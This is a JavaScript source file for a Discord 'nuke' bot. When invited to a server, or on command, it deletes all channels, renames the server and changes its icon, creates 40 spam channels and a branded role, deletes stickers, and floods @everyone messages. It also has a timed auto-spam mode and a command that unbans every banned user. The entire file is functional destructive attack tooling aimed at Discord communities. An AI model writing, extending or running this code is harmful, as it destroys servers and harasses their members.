const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');
const sizeOf = require('image-size');

let autoNukeActive = false;

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function validateImage(filePath) {
    const imageBuffer = await fs.readFile(filePath);
    const dimensions = sizeOf(imageBuffer);

    if (dimensions.type !== 'png' && dimensions.type !== 'apng') {
        throw new Error('Image must be in PNG or APNG format');
    }

    const stats = await fs.stat(filePath);
    if (stats.size > 500 * 1024) {
        throw new Error('Image size must be less than 500 KB');
    }

    if (dimensions.width < 320 || dimensions.height < 320 || dimensions.width > 4096 || dimensions.height > 4096) {
        throw new Error('Image dimensions must be between 320x320 and 4096x4096 pixels');
    }

    return imageBuffer;
}

async function performAttack(guild, config) {
    console.log('Performing attack on guild:', guild.name);

    const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
    const setNamePromise = guild.setName(config.newServerName).catch(console.error);
    const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));

    const channelNames = Array(40).fill('NUKE FUMO BY TRUONGTRUNG');
    const createChannelsPromise = Promise.all(channelNames.map(name => guild.channels.create({ name, type: ChannelType.GuildText })));

    const createRolesPromise = guild.roles.create({ name: 'NUKE FUMO BY TRUONGTRUNG', permissions: [] }).catch(console.error);

    const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));

    let createStickersPromise = Promise.resolve();
    try {
        const iconPngBuffer = await validateImage('./converted_image.png');
        createStickersPromise = Promise.all(
            Array.from({ length: 5 }, (_, i) => 
                guild.stickers.create({
                    file: iconPngBuffer,
                    name: `Sticker${i + 1}`,
                    description: `Description for Sticker${i + 1}`,
                    tags: `sticker${i + 1}`
                }).catch(console.error)
            )
        );
    } catch (error) {
        console.error('Error validating or creating sticker:', error);
    }

    await Promise.all([
        deleteChannelsPromise,
        setNamePromise,
        setIconPromise,
        createChannelsPromise,
        createRolesPromise,
        deleteStickersPromise,
        createStickersPromise
    ]);

    const newChannels = await createChannelsPromise;
    const spamPromises = [];
    for (let i = 0; i < 5; i++) {
        for (const channel of newChannels) {
            spamPromises.push(channel.send(`${channel.name} @everyone ${config.nukeMessage}`).catch(console.error));
        }
    }
    await Promise.all(spamPromises);
}

async function autoNuke(guild, config) {
    autoNukeActive = true;
    const newChannels = await guild.channels.fetch();
    const endTime = Date.now() + 3 * 60 * 1000; // 3 minutes from now

    while (autoNukeActive && Date.now() < endTime) {
        const spamPromises = [];
        for (const channel of newChannels.values()) {
            if (channel.type === ChannelType.GuildText) {
                spamPromises.push(channel.send(`@everyone ${config.nukeMessage}`).catch(console.error));
            }
        }
        await Promise.all(spamPromises);
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before next spam wave
    }
    autoNukeActive = false;
}

async function main() {
    const config = await loadConfig();

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    const prefix = '!';

    client.once('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);
    });

    client.on('guildCreate', async guild => {
        await performAttack(guild, config);
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift()?.toLowerCase();

        if (command === 'attack') {
            await performAttack(message.guild, config);
        } else if (command === 'unban_all') {
            try {
                const bans = await message.guild.bans.fetch();
                const unbanPromises = bans.map(ban => message.guild.members.unban(ban.user));
                await Promise.all(unbanPromises);
                message.channel.send(`Unbanned all users (${bans.size})`);
            } catch (error) {
                console.error('Error unbanning users:', error);
                message.channel.send('Failed to unban all users.');
            }
        } else if (command === 'auto_nuke') {
            if (args[0] === 'on') {
                if (!autoNukeActive) {
                    message.channel.send('Auto nuke started.');
                    autoNuke(message.guild, config);
                } else {
                    message.channel.send('Auto nuke is already running.');
                }
            } else if (args[0] === 'off') {
                if (autoNukeActive) {
                    autoNukeActive = false;
                    message.channel.send('Auto nuke stopped.');
                } else {
                    message.channel.send('Auto nuke is not running.');
                }
            } else {
                message.channel.send('Invalid argument. Use "on" or "off".');
            }
        }
    });

    client.login(config.token);
}

main().catch(console.error);
